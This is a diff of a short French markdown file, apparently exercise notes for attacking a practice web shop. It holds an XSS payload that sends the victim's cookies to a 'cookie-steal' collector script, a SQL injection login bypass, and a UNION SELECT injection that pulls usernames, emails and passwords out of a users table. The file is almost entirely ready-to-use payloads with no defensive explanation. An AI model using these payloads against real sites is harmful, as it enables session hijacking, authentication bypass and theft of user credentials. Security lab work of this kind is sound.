@@ -1,3 +1,4 @@
+# Injection XSS
 ## Étape 2 : Exploitation des vulnérabilités XSS pour afficher publicité
 
 ```js
@@ -11,4 +12,15 @@
 ```js
 // Payload 2 - Envoi vers serveur malveillant :
 <script>fetch('http://localhost/cookie-steal/steal.php?cookie=' + encodeURIComponent(document.cookie));</script>
+```
+
+# Injection SQL
+## Étape 2: Exploitation de l’injection SQL
+
+```text
+Pour l'injection SQL au niveau du formulaire de connexion
+' OR '1' = '1' --
+
+Pour l'injection SQL au niveau du formulaire de recherche
+' OR '1' = '1' GROUP BY p.id, p.name, p.description, p.price, p.image_url, p.created_at UNION SELECT u.id, u.username || ' ' || u.email as name, u.password as description, 0 as price, null as image_url, null as created_at, 0 as comment_count, 0 as avg_rating FROM users u --
 ```
